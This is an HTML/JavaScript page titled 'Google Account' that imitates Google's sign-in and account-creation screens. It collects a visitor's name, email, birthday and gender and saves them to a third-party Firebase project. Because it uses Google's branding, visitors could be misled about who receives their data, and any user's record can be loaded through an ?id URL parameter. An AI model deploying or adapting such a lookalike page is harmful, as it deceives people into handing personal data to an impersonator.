<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --google-blue: #1a73e8;
            --error-red: #d93025;
            --border-grey: #dadce0;
            --text-grey: #5f6368;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #202124;
        }

        .container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid var(--border-grey);
            border-radius: 8px;
            text-align: center;
            min-height: 400px;
            display: flex;
            flex-direction: column;
        }

        .logo { font-size: 24px; font-weight: 500; margin-bottom: 12px; }
        .logo span:nth-child(1) { color: #4285F4; }
        .logo span:nth-child(2) { color: #EA4335; }
        .logo span:nth-child(3) { color: #FBBC05; }
        .logo span:nth-child(4) { color: #4285F4; }
        .logo span:nth-child(5) { color: #34A853; }
        .logo span:nth-child(6) { color: #EA4335; }

        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; margin-top: 0; }
        p.subtitle { font-size: 16px; margin-bottom: 24px; color: #202124; }

        /* User Chip (Tracker) */
        .user-chip {
            display: inline-flex;
            align-items: center;
            padding: 5px 12px;
            border: 1px solid var(--border-grey);
            border-radius: 20px;
            margin: 0 auto 24px;
            max-width: fit-content;
        }
        .user-icon {
            width: 20px; height: 20px;
            background: #1a73e8; color: white;
            border-radius: 50%; font-size: 12px;
            display: flex; align-items: center; justify-content: center;
            margin-right: 8px;
        }
        .user-email { font-size: 14px; color: #3c4043; font-weight: 500; }

        .form-group { margin-bottom: 15px; text-align: left; }
        .form-row { display: flex; gap: 12px; margin-bottom: 20px; text-align: left; }
        
        input, select {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid var(--border-grey);
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus, select:focus { border: 2px solid var(--google-blue); }

        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 20px; }
        
        .link-btn { color: var(--google-blue); font-weight: 500; cursor: pointer; text-decoration: none; font-size: 14px; background: none; border: none; padding: 0; }
        
        .next-btn {
            background-color: var(--google-blue);
            color: white; border: none;
            padding: 10px 24px; border-radius: 4px;
            font-weight: 500; cursor: pointer; font-size: 14px;
        }

        .error { color: var(--error-red); font-size: 12px; margin-top: 5px; text-align: left; display: none; }

        /* Page Management */
        .page { display: none; flex-direction: column; height: 100%; flex-grow: 1; }
        .page.active { display: flex; }

        @media (max-width: 480px) { .container { border: none; padding: 20px; } }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
    </div>

    <!-- PAGE: LOGIN -->
    <div id="login-page" class="page active">
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form id="loginForm">
            <div class="form-group">
                <input type="email" id="loginEmail" placeholder="Email" required>
                <div id="loginError" class="error">Account not found</div>
            </div>
            <div class="btn-container">
                <button type="button" class="link-btn" onclick="showPage('signup-page')">Create account</button>
                <button type="submit" class="next-btn" id="loginSubmit">Next</button>
            </div>
        </form>
    </div>

    <!-- PAGE: SIGNUP -->
    <div id="signup-page" class="page">
        <h1>Create account</h1>
        <p class="subtitle">Enter your name and email</p>
        <form id="signupForm">
            <div class="form-row">
                <input type="text" id="fname" placeholder="First Name" required>
                <input type="text" id="lname" placeholder="Last Name" required>
            </div>
            <div class="form-group">
                <input type="email" id="signupEmail" placeholder="Email" required>
            </div>
            <div class="btn-container">
                <button type="button" class="link-btn" onclick="showPage('login-page')">Sign in instead</button>
                <button type="submit" class="next-btn" id="signupSubmit">Next</button>
            </div>
        </form>
    </div>

    <!-- PAGE: BASIC INFO -->
    <div id="info-page" class="page">
        <h1>Basic information</h1>
        <div class="user-chip">
            <div class="user-icon" id="user-initial">U</div>
            <div class="user-email" id="tracker-email">...</div>
        </div>
        <p class="subtitle">Enter your birthday and gender</p>
        <form id="infoForm">
            <div class="form-row">
                <select id="month" required>
                    <option value="" disabled selected>Month</option>
                    <option value="01">January</option><option value="02">February</option>
                    <option value="03">March</option><option value="04">April</option>
                    <option value="05">May</option><option value="06">June</option>
                    <option value="07">July</option><option value="08">August</option>
                    <option value="09">September</option><option value="10">October</option>
                    <option value="11">November</option><option value="12">December</option>
                </select>
                <input type="number" id="day" placeholder="Day" required>
                <input type="number" id="year" placeholder="Year" required>
            </div>
            <div id="dateError" class="error">Please enter a valid date</div>
            <div class="form-group">
                <select id="gender" required>
                    <option value="" disabled selected>Gender</option>
                    <option value="Male">Male</option>
                    <option value="Female">Female</option>
                    <option value="Prefer not to say">Prefer not to say</option>
                </select>
            </div>
            <div class="btn-container" style="justify-content: flex-end;">
                <button type="submit" class="next-btn" id="infoSubmit">Next</button>
            </div>
        </form>
    </div>

    <!-- PAGE: FINAL -->
    <div id="final-page" class="page">
        <h1>Success!</h1>
        <p class="subtitle">Your account data is updated in Firestore.</p>
        <div id="debug-id" style="font-size: 10px; color: #ccc; margin-top: 20px;"></div>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, setDoc, updateDoc, getDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDL7sPp-FkG59L-mRQ7BrCGgeKMhQC80iw",
        authDomain: "xperts-metadata.firebaseapp.com",
        projectId: "xperts-metadata",
        storageBucket: "xperts-metadata.firebasestorage.app",
        messagingSenderId: "514845910910",
        appId: "1:514845910910:web:5a2402130a97b5d749b52f",
        measurementId: "G-CQ5KWGJSZB"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    let currentUserId = "";

    // Helper: Navigation
    window.showPage = (pageId) => {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(pageId).classList.add('active');
    };

    // Helper: Generate ID
    const generateID = () => {
        const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        return Array.from({length: 25}, () => charset[Math.floor(Math.random() * charset.length)]).join('');
    };

    // 1. LOGIN LOGIC
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('loginEmail').value;
        const btn = document.getElementById('loginSubmit');
        btn.innerText = "Checking...";

        const q = query(collection(db, "users"), where("Email", "==", email));
        const querySnapshot = await getDocs(q);

        if (!querySnapshot.empty) {
            const userDoc = querySnapshot.docs[0];
            currentUserId = userDoc.id;
            setupInfoPage(userDoc.data());
        } else {
            document.getElementById('loginError').style.display = 'block';
            btn.innerText = "Next";
        }
    });

    // 2. SIGNUP LOGIC
    document.getElementById('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const fname = document.getElementById('fname').value;
        const lname = document.getElementById('lname').value;
        const email = document.getElementById('signupEmail').value;
        
        currentUserId = generateID();
        const userData = { FirstName: fname, LastName: lname, Email: email, id: currentUserId };

        await setDoc(doc(db, "users", currentUserId), userData);
        setupInfoPage(userData);
    });

    // Setup Info Page (Email Tracker UI)
    function setupInfoPage(data) {
        document.getElementById('tracker-email').innerText = data.Email;
        document.getElementById('user-initial').innerText = (data.FirstName || 'G').charAt(0).toUpperCase();
        // Update URL
        const newUrl = window.location.pathname + '?id=' + currentUserId;
        window.history.pushState({}, '', newUrl);
        showPage('info-page');
    }

    // 3. BASIC INFO LOGIC (Validation & Age)
    document.getElementById('infoForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const d = parseInt(document.getElementById('day').value);
        const m = parseInt(document.getElementById('month').value);
        const y = parseInt(document.getElementById('year').value);
        const gender = document.getElementById('gender').value;

        // Leap year and real date check
        const dateObj = new Date(y, m - 1, d);
        if (dateObj.getFullYear() !== y || dateObj.getMonth() !== m - 1 || dateObj.getDate() !== d) {
            document.getElementById('dateError').style.display = 'block';
            return;
        }

        // Age Calculation
        const today = new Date();
        let age = today.getFullYear() - y;
        if (today.getMonth() < m - 1 || (today.getMonth() === m - 1 && today.getDate() < d)) age--;

        const familyFlag = age >= 13 ? "off" : "commit";
        const dobStr = `${d.toString().padStart(2, '0')}/${m.toString().padStart(2, '0')}/${y}`;

        await updateDoc(doc(db, "users", currentUserId), {
            Gender: gender,
            DOB: dobStr,
            family: familyFlag
        });

        document.getElementById('debug-id').innerText = "Firebase ID: " + currentUserId;
        showPage('final-page');
    });

    // Auto-load if ID in URL
    window.onload = async () => {
        const id = new URLSearchParams(window.location.search).get('id');
        if (id) {
            const snap = await getDoc(doc(db, "users", id));
            if (snap.exists()) {
                currentUserId = id;
                setupInfoPage(snap.data());
            }
        }
    };
</script>
</body>
</html>
